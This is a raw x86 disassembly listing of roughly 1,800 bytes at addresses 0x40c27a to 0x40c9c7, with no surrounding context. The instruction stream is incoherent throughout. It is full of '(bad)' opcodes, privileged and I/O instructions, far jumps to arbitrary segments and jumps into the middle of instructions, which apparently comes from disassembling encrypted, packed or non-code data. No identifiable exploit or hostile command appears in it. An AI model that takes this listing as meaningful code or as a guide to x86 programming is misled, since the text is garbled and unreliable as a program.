  40c27a:	cli    
  40c27b:	ret    0x6e7a
  40c27e:	mov    bl,0xa2
  40c280:	and    ah,bh
  40c282:	add    al,BYTE PTR [eax+eiz*8]
  40c285:	aas    
  40c286:	jns    0x40c264
  40c288:	mov    eax,gs
  40c28a:	push   es
  40c28b:	mov    bl,0x5c
  40c28d:	int    0x47
  40c28f:	lea    ecx,[edi]
  40c291:	cmp    DWORD PTR ds:0x898f8ada,ecx
  40c297:	and    edi,DWORD PTR [ecx+0x57efe7bc]
  40c29d:	mov    edx,0xabbfab83
  40c2a2:	inc    esi
  40c2a3:	mov    ds:0x728d3063,eax
  40c2a8:	retf   0x613b
  40c2ab:	and    DWORD PTR [ecx],edi
  40c2ad:	(bad)  [esp+eax*1-0x2059fa7d]
  40c2b4:	out    dx,al
  40c2b5:	mov    bh,0x32
  40c2b7:	retf   0x620b
  40c2ba:	mov    cs:0x1d45a001,eax
  40c2c0:	jmp    0x7581:0xd709553d
  40c2c7:	push   0xffffffda
  40c2c9:	hlt    
  40c2ca:	push   ebp
  40c2cb:	add    al,0xb7
  40c2cd:	cdq    
  40c2ce:	and    eax,0x7f20cc2e
  40c2d3:	mov    ah,BYTE PTR [esi]
  40c2d5:	and    eax,DWORD PTR [edi]
  40c2d7:	call   DWORD PTR [esi]
  40c2d9:	cmp    eax,ebp
  40c2db:	xor    esp,ebx
  40c2dd:	(bad)  
  40c2de:	cli    
  40c2df:	inc    ecx
  40c2e0:	add    edi,edx
  40c2e2:	fld    DWORD PTR [eax+0x1d7219a2]
  40c2e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2e9:	sub    al,0x53
  40c2eb:	dec    edi
  40c2ec:	popa   
  40c2ed:	sub    eax,0x6431523f
  40c2f2:	outs   dx,BYTE PTR ds:[esi]
  40c2f3:	arpl   WORD PTR [edi],sp
  40c2f5:	retf   
  40c2f6:	jmp    0x29b3:0x5ac23a3d
  40c2fd:	sti    
  40c2fe:	sar    ebp,0x98
  40c301:	or     esp,DWORD PTR [edi]
  40c303:	add    BYTE PTR [edi-0x24dd1ace],bh
  40c309:	add    DWORD PTR [eax-0x47b5343e],ebp
  40c30f:	cmp    DWORD PTR fs:[ebx-0x5fa2d4a9],ebp
  40c316:	mov    cl,0x89
  40c318:	xchg   esi,eax
  40c319:	fnstsw WORD PTR [edi+eiz*8-0x63]
  40c31d:	inc    esp
  40c31e:	mov    BYTE PTR [ebx],0xf9
  40c321:	(bad)  
  40c322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c323:	js     0x40c35e
  40c325:	mov    al,ds:0xdc76c904
  40c32a:	mov    edi,0x136738a1
  40c32f:	push   ebx
  40c330:	dec    ecx
  40c331:	jno    0x40c315
  40c333:	cmp    eax,0x882f438b
  40c338:	sbb    DWORD PTR ds:0x39507321,0xfffffffe
  40c33f:	rcr    BYTE PTR [ebx+eiz*4-0x3f0eda47],1
  40c346:	rol    DWORD PTR [edx-0x2819d73e],1
  40c34c:	scas   eax,DWORD PTR es:[edi]
  40c34d:	(bad)  
  40c34e:	popa   
  40c34f:	loope  0x40c380
  40c351:	test   DWORD PTR [edx],ebp
  40c353:	shl    DWORD PTR ds:0xaf4bac6c,0x25
  40c35a:	jecxz  0x40c2f2
  40c35c:	fadd   DWORD PTR [ebp-0x5fc2c26a]
  40c362:	adc    DWORD PTR [esp+eax*4],eax
  40c365:	data16 xor BYTE PTR [eax+ebp*4],0xf6
  40c36a:	stc    
  40c36b:	jl     0x40c30a
  40c36d:	in     al,0x8b
  40c36f:	add    BYTE PTR [esi-0x1a],al
  40c372:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c374:	jle    0x40c36a
  40c376:	jecxz  0x40c3c4
  40c378:	call   0x3aa0c221
  40c37d:	add    bl,cl
  40c37f:	push   edx
  40c380:	test   BYTE PTR [edx+0x2719ab34],dl
  40c386:	cwde   
  40c387:	cmp    BYTE PTR [edx],0x87
  40c38a:	(bad)  
  40c38b:	fld    DWORD PTR [esp-0x1196217d]
  40c392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c393:	addr16 and al,0xd4
  40c396:	ret    
  40c397:	xchg   ecx,esp
  40c399:	fcmovnu st,st(3)
  40c39b:	sbb    esi,eax
  40c39d:	dec    eax
  40c39e:	cmp    DWORD PTR [esi+0x21354c99],esi
  40c3a4:	fldenv [ebx+0x5c]
  40c3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3a8:	add    DWORD PTR [edi+0x74],ebp
  40c3ab:	mov    BYTE PTR [ebx+0x16],dh
  40c3ae:	nop
  40c3af:	push   edi
  40c3b0:	(bad)  
  40c3b3:	push   es
  40c3b4:	(bad)  
  40c3b5:	jp     0x40c3c7
  40c3b7:	add    eax,0xd4908a46
  40c3bc:	(bad)  
  40c3bd:	add    BYTE PTR [eax-0x4b],dl
  40c3c0:	lahf   
  40c3c1:	mov    edx,0x7b0b2584
  40c3c6:	xchg   DWORD PTR [eax+0x5373f784],edi
  40c3cc:	xchg   edx,eax
  40c3cd:	(bad)  
  40c3ce:	pop    ds
  40c3cf:	fs jno 0x40c39d
  40c3d2:	aad    0xad
  40c3d4:	push   edi
  40c3d5:	or     eax,0x37fe445
  40c3da:	xor    ch,ah
  40c3dc:	cmp    al,0xa3
  40c3de:	jne    0x40c44b
  40c3e0:	inc    edx
  40c3e1:	fmul   QWORD PTR [ebp-0x19831069]
  40c3e7:	aas    
  40c3e8:	cli    
  40c3e9:	jmp    0x95bdcd62
  40c3ee:	retf   
  40c3ef:	cmp    BYTE PTR [ecx],0x5c
  40c3f2:	adc    BYTE PTR [edi],dh
  40c3f4:	stos   DWORD PTR es:[edi],eax
  40c3f5:	xchg   edx,eax
  40c3f6:	fidivr WORD PTR [esi+0x72a69269]
  40c3fc:	std    
  40c3fd:	inc    ecx
  40c3fe:	mov    cl,0x3d
  40c400:	mov    ds:0xaef23ff6,eax
  40c405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c406:	nop
  40c407:	dec    ebx
  40c408:	ins    DWORD PTR es:[edi],dx
  40c409:	test   DWORD PTR ds:0x12262517,ebp
  40c40f:	lods   al,BYTE PTR ds:[esi]
  40c410:	mul    DWORD PTR [ebp-0x52]
  40c413:	and    edi,DWORD PTR [edi+0x457b3cdf]
  40c419:	clc    
  40c41a:	add    bl,dh
  40c41c:	fwait
  40c41d:	cmp    dh,ah
  40c41f:	jo     0x40c499
  40c421:	popa   
  40c422:	outs   dx,BYTE PTR ds:[si]
  40c424:	and    eax,0xf1248a7d
  40c429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c42a:	fstp   QWORD PTR [ecx+0x88b1f6a]
  40c430:	pop    DWORD PTR [edi+edi*4]
  40c433:	test   al,0xa7
  40c435:	(bad)  
  40c436:	jecxz  0x40c437
  40c438:	add    DWORD PTR [edx],ebp
  40c43a:	repnz dec esp
  40c43c:	aam    0x9a
  40c43e:	inc    ebp
  40c43f:	inc    eax
  40c440:	cwde   
  40c441:	pop    ebp
  40c442:	jae    0x40c40e
  40c444:	mov    edi,0xd831e399
  40c449:	xchg   edi,eax
  40c44a:	popa   
  40c44b:	aad    0x0
  40c44d:	pop    es
  40c44e:	repnz fnstenv [edx-0x2fa42c1]
  40c455:	stos   BYTE PTR es:[edi],al
  40c456:	mov    WORD PTR ds:0xfbefa4e2,ss
  40c45c:	es pop ebx
  40c45e:	bound  ecx,QWORD PTR [edi+ecx*1-0x27d719a2]
  40c465:	cli    
  40c466:	in     eax,0x2f
  40c468:	sar    BYTE PTR [ebx+0xdefc802],1
  40c46e:	cdq    
  40c46f:	std    
  40c470:	mov    ebp,0x8b3d7467
  40c475:	and    BYTE PTR [edx-0x16],al
  40c478:	jo     0x40c495
  40c47a:	scas   al,BYTE PTR es:[edi]
  40c47b:	dec    esp
  40c47c:	sbb    eax,0x2cf15d32
  40c481:	lahf   
  40c482:	xchg   esp,eax
  40c483:	sar    BYTE PTR [ebx-0x33c74dbf],0xe4
  40c48a:	jo     0x40c42f
  40c48c:	scas   eax,DWORD PTR es:[edi]
  40c48d:	add    eax,0xe35a7a4e
  40c492:	scas   eax,DWORD PTR es:[edi]
  40c493:	outs   dx,DWORD PTR ds:[esi]
  40c494:	stos   BYTE PTR es:[edi],al
  40c495:	cmp    DWORD PTR [eax-0x4e97bef3],ebx
  40c49b:	shl    DWORD PTR [bp+di+0x70],cl
  40c49f:	mov    dl,0x1e
  40c4a1:	sbb    al,0x8c
  40c4a3:	shl    dl,1
  40c4a5:	add    dl,cl
  40c4a7:	sbb    al,0x36
  40c4a9:	jmp    0x40c438
  40c4ab:	cdq    
  40c4ac:	test   al,0x57
  40c4ae:	(bad)  
  40c4b0:	in     eax,0x6d
  40c4b2:	hlt    
  40c4b3:	cli    
  40c4b4:	pop    esp
  40c4b5:	sub    eax,DWORD PTR [edx-0x11]
  40c4b8:	les    eax,FWORD PTR [ebx+0xf]
  40c4bb:	add    cl,bh
  40c4bd:	xor    al,0xda
  40c4bf:	or     cl,BYTE PTR [ebp-0x29]
  40c4c2:	icebp  
  40c4c3:	call   0x5dace9da
  40c4c8:	ret    
  40c4c9:	xchg   ecx,eax
  40c4ca:	jg     0x40c4ce
  40c4cc:	mov    ds:0xb9035dba,eax
  40c4d1:	dec    esi
  40c4d2:	into   
  40c4d3:	repnz loop 0x40c485
  40c4d6:	pop    esp
  40c4d7:	inc    ebp
  40c4d8:	(bad)  
  40c4d9:	fadd   DWORD PTR [eax]
  40c4db:	push   ebx
  40c4dc:	repnz nop
  40c4de:	push   cs
  40c4df:	std    
  40c4e0:	cmp    DWORD PTR [eax+0x460d5975],ebx
  40c4e6:	mov    edx,0xe60edf08
  40c4eb:	adc    eax,0xca21f119
  40c4f0:	adc    al,0x61
  40c4f2:	adc    al,0xcd
  40c4f4:	out    0x87,eax
  40c4f6:	clc    
  40c4f7:	fbld   TBYTE PTR ds:0x6bb1923a
  40c4fd:	icebp  
  40c4fe:	mov    bl,0x65
  40c500:	sbb    edi,edx
  40c502:	addr16 addr16 fcmovne st,st(0)
  40c506:	int    0x9f
  40c508:	in     al,dx
  40c509:	mov    al,0xba
  40c50b:	ret    
  40c50c:	inc    ecx
  40c50d:	mov    bh,0x4c
  40c50f:	ins    BYTE PTR es:[edi],dx
  40c510:	stos   DWORD PTR es:[edi],eax
  40c511:	in     al,dx
  40c512:	mov    eax,ds:0x688cddbe
  40c517:	retf   0xc1c5
  40c51a:	mov    ch,0x45
  40c51c:	sbb    ecx,DWORD PTR [esi]
  40c51e:	in     al,0xb2
  40c520:	dec    edi
  40c521:	sti    
  40c522:	and    esp,DWORD PTR [esp+esi*2-0x2585345e]
  40c529:	in     eax,dx
  40c52a:	dec    esi
  40c52b:	enter  0x86af,0x98
  40c52f:	mov    edx,0x4b97c4a7
  40c534:	mov    dh,ah
  40c536:	or     ch,BYTE PTR [ebx-0x779f27b7]
  40c53c:	push   ds
  40c53d:	retf   
  40c53e:	xor    al,0xde
  40c540:	cmpps  xmm4,XMMWORD PTR [ecx+0x4],0x5a
  40c545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c546:	push   ss
  40c547:	sbb    cl,BYTE PTR [edi-0x20]
  40c54a:	xor    DWORD PTR [ecx+0x2efaf931],esp
  40c550:	(bad)  
  40c552:	jle    0x40c4f4
  40c554:	mov    bl,0xfa
  40c556:	adc    al,al
  40c558:	and    dh,bh
  40c55a:	call   FWORD PTR [ebx]
  40c55c:	lods   al,BYTE PTR ds:[esi]
  40c55d:	jecxz  0x40c55e
  40c55f:	shr    DWORD PTR [eax+edi*8+0x7c824f89],1
  40c566:	jns    0x40c56e
  40c568:	push   ebx
  40c569:	sbb    DWORD PTR ds:0x3af8ceba,esi
  40c56f:	jnp    0x40c594
  40c571:	inc    ecx
  40c572:	sub    ax,si
  40c575:	mov    esp,0xaf47bab9
  40c57a:	fldenv [esi]
  40c57c:	push   edx
  40c57d:	cmp    BYTE PTR [eax+0x78],bl
  40c580:	mov    ebx,0xdb4bebef
  40c585:	fidiv  DWORD PTR [esi]
  40c587:	push   es
  40c588:	test   al,0x99
  40c58a:	xchg   DWORD PTR [edx-0x30],ecx
  40c58d:	pop    ds
  40c58e:	dec    edi
  40c58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c590:	inc    esp
  40c591:	sbb    ecx,ebx
  40c593:	push   ss
  40c594:	ficomp WORD PTR ds:0x127e11db
  40c59a:	lods   al,BYTE PTR ds:[esi]
  40c59b:	push   esp
  40c59c:	adc    DWORD PTR [ebx-0x2f7bb510],ebx
  40c5a2:	test   ch,dh
  40c5a4:	push   ebx
  40c5a5:	div    DWORD PTR [esi+0x2d]
  40c5a8:	sbb    esp,DWORD PTR [eax+0x45]
  40c5ab:	pop    es
  40c5ac:	adc    al,0x18
  40c5ae:	lds    esi,FWORD PTR [edi-0x4e]
  40c5b1:	stc    
  40c5b2:	outs   dx,BYTE PTR ds:[esi]
  40c5b3:	(bad)  
  40c5b4:	pop    ds
  40c5b5:	sub    al,0x47
  40c5b7:	cmp    eax,0x589d8607
  40c5bc:	pop    ds
  40c5bd:	out    0xa9,al
  40c5bf:	mov    ecx,0x196c38c7
  40c5c4:	add    DWORD PTR [edx+esi*1],ebx
  40c5c7:	jbe    0x40c59c
  40c5c9:	mov    DWORD PTR [ecx-0x7b4031a4],edi
  40c5cf:	cmp    al,0x52
  40c5d1:	lahf   
  40c5d2:	ja     0x40c598
  40c5d4:	fs add al,0xc6
  40c5d7:	sbb    DWORD PTR cs:[eax],0x2e
  40c5db:	sub    ebx,DWORD PTR [ecx+0x6d]
  40c5de:	pcmpeqd mm4,QWORD PTR ds:0xbff6b6be
  40c5e5:	pop    ss
  40c5e6:	jl     0x40c5d9
  40c5e8:	adc    bl,0x75
  40c5eb:	mov    DWORD PTR [ebx],esp
  40c5ed:	mov    BYTE PTR [edi],bh
  40c5ef:	mov    ebx,0x5989559e
  40c5f4:	push   bp
  40c5f6:	stos   BYTE PTR es:[edi],al
  40c5f7:	mov    BYTE PTR [ebx-0x59d586dc],al
  40c5fd:	mov    edx,0x5164b708
  40c602:	pop    ebx
  40c603:	lds    ecx,FWORD PTR [eax-0x6d]
  40c606:	jbe    0x40c5e2
  40c608:	push   ecx
  40c609:	dec    ebx
  40c60a:	xchg   edx,eax
  40c60b:	pop    edx
  40c60c:	aam    0xf
  40c60e:	push   esi
  40c60f:	xchg   esi,eax
  40c610:	jecxz  0x40c664
  40c612:	in     al,dx
  40c613:	repnz mov gs:0x52f43cd1,eax
  40c61a:	dec    esi
  40c61b:	aaa    
  40c61c:	and    eax,0xd9a4b2e
  40c621:	dec    esp
  40c622:	cwde   
  40c623:	pop    ss
  40c624:	pusha  
  40c625:	sbb    eax,edx
  40c627:	and    al,0xa4
  40c629:	fistp  DWORD PTR [esi+0x9265fa6]
  40c62f:	mov    ecx,0xe8bc55f8
  40c634:	pusha  
  40c635:	mov    dl,0x46
  40c637:	push   cs
  40c638:	icebp  
  40c639:	sub    cl,BYTE PTR [ecx]
  40c63b:	fnsave [edx-0x4]
  40c63e:	push   ebp
  40c63f:	sub    esp,esp
  40c641:	pop    ds
  40c642:	popa   
  40c643:	test   BYTE PTR [eax+0x2ad13970],bh
  40c649:	popf   
  40c64a:	jg     0x40c609
  40c64c:	call   DWORD PTR [esi*1+0x7b0b795]
  40c653:	data16 cmp al,0x57
  40c656:	nop
  40c657:	xchg   esi,eax
  40c658:	ins    BYTE PTR es:[edi],dx
  40c659:	(bad)  
  40c65a:	cmp    bl,BYTE PTR [edi]
  40c65c:	xor    esi,edx
  40c65e:	mov    ah,0x6c
  40c660:	or     al,0xea
  40c662:	shl    DWORD PTR [edi+0x63d4bdff],1
  40c668:	cdq    
  40c669:	sbb    BYTE PTR [edx+0x31],al
  40c66c:	out    dx,eax
  40c66d:	iret   
  40c66e:	adc    eax,0x709d3174
  40c673:	push   es
  40c674:	mov    dl,0xf5
  40c676:	aam    0x7f
  40c678:	ror    dl,0x56
  40c67b:	sub    dh,bh
  40c67d:	add    DWORD PTR [ebx+0x37],edx
  40c680:	rol    ch,1
  40c682:	lods   eax,DWORD PTR ds:[esi]
  40c683:	mov    ecx,0x1fa25a3b
  40c688:	push   ebp
  40c689:	cmp    DWORD PTR ds:0x5c8daaa7,esp
  40c68f:	in     al,0xb1
  40c691:	dec    ebx
  40c692:	jge    0x40c693
  40c694:	test   eax,0x6bffe3ce
  40c699:	mov    dh,0x94
  40c69b:	mov    BYTE PTR [eax-0x74197c5a],al
  40c6a1:	mov    esp,0xde4458e3
  40c6a6:	dec    esi
  40c6a7:	inc    edx
  40c6a8:	sbb    al,0x66
  40c6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ab:	adc    eax,0x3b609bc7
  40c6b0:	pop    esp
  40c6b1:	adc    DWORD PTR [esi-0x2],esp
  40c6b4:	test   edx,edi
  40c6b6:	push   ebp
  40c6b7:	add    al,0x7d
  40c6b9:	push   edx
  40c6ba:	xchg   edx,eax
  40c6bb:	sub    ecx,DWORD PTR [esi-0x73]
  40c6be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6bf:	hlt    
  40c6c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c1:	mov    ah,0x59
  40c6c3:	in     al,0xd7
  40c6c5:	repnz push edx
  40c6c7:	lahf   
  40c6c8:	add    DWORD PTR [ebx+edx*1+0x16],ecx
  40c6cc:	push   0xef4b1f63
  40c6d1:	xor    esp,0x21
  40c6d4:	retf   
  40c6d5:	push   esi
  40c6d6:	pop    esp
  40c6d7:	jne    0x40c6fc
  40c6d9:	imul   edx,DWORD PTR [edx+0x65],0x3d554a93
  40c6e0:	repnz imul ebp,DWORD PTR [esi-0x40],0xa88fa132
  40c6e8:	mov    cl,0xd2
  40c6ea:	cld    
  40c6eb:	out    0x60,eax
  40c6ed:	dec    BYTE PTR [ebx]
  40c6ef:	cs in  eax,0x2d
  40c6f2:	cs data16 ss jne 0x40c749
  40c6f7:	fnsave [bp+si-0x37e5]
  40c6fc:	pop    ss
  40c6fd:	fcmovnu st,st(3)
  40c6ff:	jl     0x40c6f9
  40c701:	out    0x49,eax
  40c703:	jne    0x40c765
  40c705:	and    al,BYTE PTR [ecx+0xa]
  40c708:	std    
  40c709:	das    
  40c70a:	cmp    al,0x61
  40c70c:	cmp    al,0xe1
  40c70e:	and    DWORD PTR [ebx-0x54],edi
  40c711:	mov    al,0xdf
  40c713:	hlt    
  40c714:	push   ds
  40c715:	sub    ah,BYTE PTR [ebx]
  40c717:	aaa    
  40c718:	ficomp WORD PTR [eax]
  40c71a:	sub    eax,0x86184faa
  40c71f:	fsubrp st(4),st
  40c721:	int3   
  40c722:	cld    
  40c723:	adc    eax,0x2705dd91
  40c728:	cli    
  40c729:	in     eax,0x9
  40c72b:	and    esp,DWORD PTR [ebx+0x3a054fb3]
  40c731:	sahf   
  40c732:	and    DWORD PTR [ebx],edi
  40c734:	xor    ebx,DWORD PTR [eax-0x65]
  40c737:	sub    BYTE PTR [ecx],al
  40c739:	sbb    al,0x8
  40c73b:	icebp  
  40c73c:	jl     0x40c75b
  40c73e:	pop    esp
  40c73f:	daa    
  40c740:	push   eax
  40c741:	dec    esp
  40c742:	push   edx
  40c743:	jecxz  0x40c775
  40c745:	jns    0x40c72b
  40c747:	fistp  DWORD PTR [ecx]
  40c749:	jle    0x40c75f
  40c74b:	call   DWORD PTR [esi+0x1e]
  40c74e:	fistp  QWORD PTR [ecx+0x72f2c10f]
  40c754:	rol    BYTE PTR [ebx+0x34],1
  40c757:	push   ds
  40c758:	push   cs
  40c759:	punpcklbw mm1,DWORD PTR [eax+eiz*4]
  40c75d:	adc    bl,BYTE PTR [ecx]
  40c75f:	stos   DWORD PTR es:[edi],eax
  40c760:	mov    cl,0x90
  40c762:	fcomip st,st(0)
  40c764:	xor    ecx,DWORD PTR [eax+0x116248cf]
  40c76a:	jp     0x40c71b
  40c76c:	addr16 cmc 
  40c76e:	fimul  DWORD PTR [eax-0x51]
  40c771:	mov    al,BYTE PTR [ebp-0x2aeb74b3]
  40c777:	mov    dl,BYTE PTR [edx+0x1b]
  40c77a:	(bad)  
  40c77b:	dec    esi
  40c77c:	pop    edx
  40c77d:	mul    DWORD PTR ds:0x6be8f10
  40c783:	retf   0x3b14
  40c786:	in     al,dx
  40c787:	mov    ebp,0xb37adb13
  40c78c:	aaa    
  40c78d:	cmp    ecx,ecx
  40c78f:	popa   
  40c790:	mov    esi,0xbe349630
  40c795:	jbe    0x40c79a
  40c797:	xlat   BYTE PTR ds:[ebx]
  40c798:	and    BYTE PTR ds:0x7fa2c75e,al
  40c79e:	jb     0x40c7a7
  40c7a0:	je     0x40c791
  40c7a2:	(bad)  
  40c7a3:	mov    ah,0x1f
  40c7a5:	pop    es
  40c7a6:	inc    esi
  40c7a7:	xor    al,0x1f
  40c7aa:	out    0xbb,al
  40c7ac:	xor    BYTE PTR [ecx],bh
  40c7ae:	ins    BYTE PTR es:[edi],dx
  40c7af:	and    bh,BYTE PTR [edx-0x612d3f95]
  40c7b5:	dec    esi
  40c7b6:	imul   ebx,DWORD PTR [edx-0x2b],0xffffff8a
  40c7ba:	ret    
  40c7bb:	dec    ebx
  40c7bc:	cmc    
  40c7bd:	xor    ecx,0xfffffff6
  40c7c0:	push   ds
  40c7c1:	loopne 0x40c78e
  40c7c3:	cdq    
  40c7c4:	icebp  
  40c7c5:	push   edx
  40c7c6:	rol    BYTE PTR [ecx+esi*8+0x51],0xdb
  40c7cb:	retf   0xdc7f
  40c7ce:	popa   
  40c7cf:	cdq    
  40c7d0:	cld    
  40c7d1:	jg     0x40c82d
  40c7d3:	test   DWORD PTR [ebp+eiz*2-0x2f97349d],esi
  40c7da:	icebp  
  40c7db:	sahf   
  40c7dc:	pop    ecx
  40c7dd:	test   DWORD PTR [ebx-0x1d],ebx
  40c7e0:	pop    ds
  40c7e1:	mov    ecx,0x9efca848
  40c7e6:	rcl    cl,0x33
  40c7e9:	sahf   
  40c7ea:	retf   
  40c7eb:	xor    esi,DWORD PTR [edx]
  40c7ed:	shl    ch,0xf
  40c7f0:	mov    dh,0xb0
  40c7f2:	arpl   WORD PTR [eax-0x10],ax
  40c7f5:	mov    bh,0x78
  40c7f7:	add    DWORD PTR [ebp+0x6156b98a],0x4d707d26
  40c801:	cs pop ebp
  40c803:	arpl   di,sp
  40c805:	out    dx,al
  40c806:	xor    dh,BYTE PTR [edi-0x6]
  40c809:	stos   BYTE PTR es:[edi],al
  40c80a:	(bad)  
  40c80b:	xor    ecx,edi
  40c80d:	xchg   ecx,eax
  40c80e:	pop    ebp
  40c80f:	mov    BYTE PTR [esi+ecx*1],ah
  40c812:	in     eax,0x7b
  40c814:	retf   0xc990
  40c817:	cmp    ah,dl
  40c819:	jne    0x40c85d
  40c81b:	xchg   edi,eax
  40c81c:	ja     0x40c817
  40c81e:	or     al,0x45
  40c820:	loop   0x40c845
  40c822:	shl    ch,cl
  40c824:	daa    
  40c825:	gs dec ebx
  40c827:	leave  
  40c828:	push   edx
  40c829:	lods   al,BYTE PTR ds:[esi]
  40c82a:	mov    esp,0x7d94594
  40c82f:	sub    dl,BYTE PTR [ecx+eax*4-0x70]
  40c833:	xor    DWORD PTR [ebx],0xffffff88
  40c836:	data16 sub cl,ah
  40c839:	mov    dh,dl
  40c83b:	pop    ebp
  40c83c:	sbb    DWORD PTR [esp+ebx*4+0x52],ecx
  40c840:	sub    eax,0xf0be76da
  40c845:	mov    esi,0x7eb0df45
  40c84a:	and    eax,0xc365880f
  40c84f:	ds nop
  40c851:	sub    cl,BYTE PTR [ebp+0x58]
  40c854:	or     al,0x0
  40c856:	dec    BYTE PTR [edx-0x43]
  40c859:	add    ebx,DWORD PTR [ebx-0x51]
  40c85c:	sbb    ecx,eax
  40c85e:	ror    BYTE PTR [edi+0x64],0xb2
  40c862:	arpl   cx,bx
  40c864:	inc    esi
  40c865:	cmp    edi,edi
  40c867:	cli    
  40c868:	mov    bl,0x87
  40c86a:	stos   BYTE PTR es:[edi],al
  40c86b:	dec    edx
  40c86c:	cmp    bh,BYTE PTR [edx]
  40c86e:	xor    ecx,DWORD PTR [edi]
  40c870:	popf   
  40c871:	das    
  40c872:	iret   
  40c873:	pushf  
  40c874:	sar    DWORD PTR [ebp+0x488ca93a],1
  40c87a:	jge    0x40c8bb
  40c87c:	push   eax
  40c87d:	ins    DWORD PTR es:[edi],dx
  40c87e:	cdq    
  40c87f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c880:	js     0x40c8d7
  40c882:	cmp    ebx,DWORD PTR [ebp-0x3cff2ec]
  40c888:	dec    esp
  40c889:	aad    0x25
  40c88b:	jp     0x40c8bb
  40c88d:	stos   BYTE PTR es:[edi],al
  40c88e:	push   ss
  40c88f:	data16 jo 0x40c8b9
  40c892:	push   dx
  40c894:	aad    0x6c
  40c896:	push   eax
  40c897:	xor    eax,0xedb59914
  40c89c:	(bad)  
  40c89d:	stc    
  40c89e:	xchg   DWORD PTR [ecx+0x59a44075],ebx
  40c8a4:	fsub   DWORD PTR [eax-0x71]
  40c8a7:	mov    esp,0x5144fc22
  40c8ac:	jecxz  0x40c877
  40c8ae:	stc    
  40c8af:	ins    BYTE PTR es:[edi],dx
  40c8b0:	inc    eax
  40c8b1:	dec    edi
  40c8b2:	mov    ecx,0xb3927f0e
  40c8b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8b8:	sub    eax,0x123bfd37
  40c8bd:	and    eax,0x4edd06be
  40c8c2:	sbb    cl,BYTE PTR [ecx-0x3f]
  40c8c5:	or     BYTE PTR [ebp+0x8],dl
  40c8c8:	in     eax,0xbe
  40c8ca:	popf   
  40c8cb:	adc    eax,0x7a536412
  40c8d0:	data16 loope 0x40c8c5
  40c8d3:	popa   
  40c8d4:	call   0xf252:0xff142e2b
  40c8db:	xlat   BYTE PTR ds:[ebx]
  40c8dc:	or     DWORD PTR [eax],ecx
  40c8de:	retf   0x212f
  40c8e1:	fwait
  40c8e2:	xor    DWORD PTR [ebx+ecx*1],ecx
  40c8e5:	clc    
  40c8e6:	jmp    0x492b:0xa00c7a7f
  40c8ed:	mov    ds:0xa3045c18,al
  40c8f2:	sbb    eax,0x9845d978
  40c8f7:	inc    edx
  40c8f8:	out    0xf2,al
  40c8fa:	mov    ecx,0x90362a35
  40c8ff:	mov    esi,0x1f4dbe80
  40c904:	into   
  40c905:	sub    al,0x61
  40c907:	scas   al,BYTE PTR es:[edi]
  40c908:	popf   
  40c909:	sub    BYTE PTR [eiz*2-0x607253b],cl
  40c910:	jecxz  0x40c946
  40c912:	popa   
  40c913:	lock jle 0x40c8d4
  40c916:	imul   ecx,DWORD PTR [edi+edx*8-0x61],0xffffffec
  40c91b:	outs   dx,BYTE PTR ds:[esi]
  40c91c:	jo     0x40c904
  40c91e:	inc    ecx
  40c91f:	in     al,dx
  40c920:	aam    0x37
  40c922:	test   BYTE PTR [ecx+edi*8-0xc601a9c],dh
  40c929:	cs adc al,0x74
  40c92c:	mov    ebx,0xea683ae1
  40c931:	sti    
  40c932:	ins    BYTE PTR es:[edi],dx
  40c933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c934:	dec    edi
  40c935:	xchg   esp,eax
  40c936:	cld    
  40c937:	xchg   ebp,eax
  40c938:	xchg   ebp,eax
  40c939:	adc    BYTE PTR [edi+0x75],dh
  40c93c:	call   0xea67:0xa548572b
  40c943:	push   es
  40c944:	cdq    
  40c945:	or     ecx,DWORD PTR [esi-0x2b10ef85]
  40c94b:	sub    dl,dl
  40c94d:	cmp    esp,edi
  40c94f:	imul   BYTE PTR ds:0xed5c7243
  40c955:	push   esi
  40c956:	jb     0x40c9ad
  40c958:	sub    al,0x33
  40c95a:	cs sti 
  40c95c:	fwait
  40c95d:	lods   al,BYTE PTR ds:[esi]
  40c95e:	pop    esi
  40c95f:	leave  
  40c960:	cmp    BYTE PTR ds:0x3b83ed3e,0x37
  40c967:	xchg   BYTE PTR cs:[edx+0x3],bh
  40c96b:	ret    0xa2b4
  40c96e:	xor    dh,BYTE PTR [edx+0x4be53b79]
  40c974:	push   ebx
  40c975:	pop    ecx
  40c976:	pop    es
  40c977:	xchg   ecx,eax
  40c978:	push   ebp
  40c979:	add    eax,0xea3b710c
  40c97e:	in     al,dx
  40c97f:	mov    ecx,0xeaf2c60b
  40c984:	fstp   st(4)
  40c986:	js     0x40c92f
  40c988:	sub    dl,bl
  40c98a:	je     0x40c9b0
  40c98c:	fldcw  WORD PTR [edx-0x282f7732]
  40c992:	cmp    edx,ebx
  40c994:	mov    bh,0x0
  40c996:	pop    ecx
  40c997:	or     DWORD PTR [eax],ebx
  40c999:	mov    ds,WORD PTR [edx]
  40c99b:	xlat   BYTE PTR ds:[ebx]
  40c99c:	aam    0x55
  40c99e:	lods   al,BYTE PTR ds:[esi]
  40c99f:	cli    
  40c9a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a1:	add    DWORD PTR ds:0x69b82cd7,0xffffff98
  40c9a8:	enter  0xbee7,0xb6
  40c9ac:	dec    ebx
  40c9ad:	stc    
  40c9ae:	and    BYTE PTR ds:0x11f1b820,bl
  40c9b4:	adc    eax,0xa6a679b5
  40c9b9:	stc    
  40c9ba:	xchg   BYTE PTR [ebp+0x79],dh
  40c9bd:	sbb    bl,BYTE PTR [eax+ebx*1+0x3c]
  40c9c1:	sbb    edi,DWORD PTR [ebp+0xdd0b293]
  40c9c7:	adc    bh,BYTE PTR [esi-0x75]
